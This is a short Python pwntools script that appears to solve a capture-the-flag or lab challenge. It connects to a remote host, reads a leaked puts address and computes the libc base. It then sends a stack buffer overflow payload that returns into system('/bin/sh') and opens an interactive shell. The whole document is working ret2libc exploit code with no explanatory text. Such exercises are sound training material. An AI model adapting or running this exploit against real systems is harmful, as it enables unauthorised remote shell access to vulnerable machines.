from pwn import *

BIN = './libc-master'
LIBC = './libc.so.6'
# LIBC = '/lib/i386-linux-gnu/libc.so.6'
context.binary = BIN

# p = process(BIN)
p = remote('141.85.224.106', 31443)
elf = ELF(BIN)

libc = ELF(LIBC)

p.recvuntil(b'0x')
leak = p.recvuntil(b'\n\n')[:-2]
puts_addr = int(leak.decode(), 16)

libc.address = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b"/bin/sh\x00"))

payload = b'a' * (0x100 + 4) + pack(system_addr) + b'a' * 4 + pack(bin_sh_addr)
p.sendline(payload);

p.recvuntil(b'...\n');
p.interactive()
